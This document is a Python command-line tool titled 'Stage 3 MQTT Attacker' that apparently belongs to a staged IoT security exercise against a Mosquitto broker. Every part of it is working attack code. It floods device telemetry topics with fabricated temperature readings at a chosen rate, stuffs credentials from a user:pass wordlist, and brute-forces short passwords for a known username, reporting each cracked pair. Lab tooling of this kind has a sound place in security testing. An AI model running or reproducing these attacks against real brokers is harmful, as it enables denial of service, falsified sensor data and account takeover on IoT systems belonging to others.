#!/usr/bin/env python3
"""
Stage 3 Attacker - MQTT Flood + Brute Force
Targets: telemetry/<device_id> topics on the Mosquitto broker
"""

import paho.mqtt.client as mqtt
import time
import json
import argparse
import itertools
import string
import random
from threading import Event, Thread

# ─── Shared ───────────────────────────────────────────────────────────────────

found_event = Event()

def log(tag, msg, color="\033[0m"):
    print(f"{color}[{tag}]\033[0m {msg}")

def info(m):    log("*", m, "\033[94m")
def success(m): log("+", m, "\033[92m")
def warn(m):    log("!", m, "\033[93m")
def error(m):   log("-", m, "\033[91m")


# ─── Attack 1: MQTT Flood ─────────────────────────────────────────────────────

def mqtt_flood(
    host: str,
    port: int,
    device_id: str,
    username: str | None,
    password: str | None,
    rate: int = 100,       # messages per second
    duration: int = 30,    # seconds
):
    """
    Flood telemetry/<device_id> with fake telemetry at high rate.
    Simulates a compromised device or a replay attack.
    """
    topic = f"telemetry/{device_id}"
    client = mqtt.Client(client_id=f"flood-{device_id}")

    if username:
        client.username_pw_set(username, password)

    connected = Event()
    def on_connect(c, ud, flags, rc):
        if rc == 0:
            connected.set()
        else:
            error(f"Flood connect failed RC={rc}")

    client.on_connect = on_connect

    try:
        client.connect(host, port, keepalive=60)
        client.loop_start()
        connected.wait(timeout=5)

        if not connected.is_set():
            error("Could not connect for flood.")
            return

        info(
            f"Flooding topic '{topic}' at {rate} msg/s "
            f"for {duration}s..."
        )

        interval = 1.0 / rate
        end_time = time.time() + duration
        sent = 0

        while time.time() < end_time:
            payload = json.dumps({
                "device_id": device_id,
                "temperature": round(random.uniform(20.0, 95.0), 2),
                "ts": time.time(),
            })
            client.publish(topic, payload, qos=0)
            sent += 1
            time.sleep(interval)

        success(f"Flood complete. Sent {sent} messages to '{topic}'.")

    except Exception as e:
        error(f"Flood error: {e}")
    finally:
        client.loop_stop()
        client.disconnect()


# ─── Attack 2: Brute Force Auth ───────────────────────────────────────────────

def _try_cred(host, port, username, password) -> bool:
    rc_box = [None]
    done = Event()

    def on_connect(c, ud, flags, rc):
        rc_box[0] = rc
        done.set()

    c = mqtt.Client(client_id=f"bf-{random.randint(1000,9999)}")
    c.username_pw_set(username, password)
    c.on_connect = on_connect
    try:
        c.connect(host, port, keepalive=5)
        c.loop_start()
        done.wait(timeout=4)
    except Exception:
        return False
    finally:
        c.loop_stop()
        try: c.disconnect()
        except: pass

    return rc_box[0] == 0


def brute_force_wordlist(host, port, wordlist_path):
    """Credential stuffing from a user:pass wordlist."""
    info(f"Brute force (wordlist) → {host}:{port}")

    try:
        with open(wordlist_path) as f:
            pairs = [l.strip() for l in f if ":" in l.strip()]
    except FileNotFoundError:
        error(f"Wordlist not found: {wordlist_path}")
        return

    info(f"Loaded {len(pairs)} pairs.")

    for pair in pairs:
        if found_event.is_set():
            break
        user, _, pwd = pair.partition(":")
        info(f"Trying {user!r}:{pwd!r}")
        if _try_cred(host, port, user, pwd):
            found_event.set()
            success(f"CRACKED → {user!r}:{pwd!r}")
            return
        time.sleep(0.2)

    if not found_event.is_set():
        warn("Wordlist exhausted — no valid credentials.")


def brute_force_charset(
    host, port, username,
    charset=string.ascii_lowercase + string.digits,
    min_len=1, max_len=4,
):
    """Pure charset brute force for a known username."""
    info(f"Brute force (charset) for user '{username}' → {host}:{port}")
    total = sum(len(charset) ** l for l in range(min_len, max_len + 1))
    info(f"~{total} attempts | len {min_len}-{max_len}")

    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            if found_event.is_set():
                return
            pwd = "".join(combo)
            info(f"Trying {username!r}:{pwd!r}")
            if _try_cred(host, port, username, pwd):
                found_event.set()
                success(f"CRACKED → {username!r}:{pwd!r}")
                return
            time.sleep(0.15)

    if not found_event.is_set():
        warn("Charset space exhausted.")


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description="Stage 3 MQTT Attacker")
    p.add_argument("host", help="Broker IP/hostname")
    p.add_argument("--port", type=int, default=1883)

    sub = p.add_subparsers(dest="mode", required=True)

    # flood
    fl = sub.add_parser("flood", help="High-rate publish flood")
    fl.add_argument("--device-id", default="attacker-001")
    fl.add_argument("--username", default=None)
    fl.add_argument("--password", default=None)
    fl.add_argument("--rate", type=int, default=100,
                    help="Messages per second")
    fl.add_argument("--duration", type=int, default=30,
                    help="Duration in seconds")

    # brute-wordlist
    bw = sub.add_parser("brute-wordlist")
    bw.add_argument("--wordlist", required=True)

    # brute-charset
    bc = sub.add_parser("brute-charset")
    bc.add_argument("--username", required=True)
    bc.add_argument("--max-len", type=int, default=4)

    args = p.parse_args()

    print("\033[91m╔══════════════════════════╗")
    print("║  Stage 3 — MQTT Attacker  ║")
    print("╚══════════════════════════╝\033[0m\n")

    if args.mode == "flood":
        mqtt_flood(
            args.host, args.port,
            args.device_id,
            args.username, args.password,
            args.rate, args.duration,
        )
    elif args.mode == "brute-wordlist":
        brute_force_wordlist(args.host, args.port, args.wordlist)
    elif args.mode == "brute-charset":
        brute_force_charset(
            args.host, args.port, args.username,
            max_len=args.max_len,
        )


if __name__ == "__main__":
    main()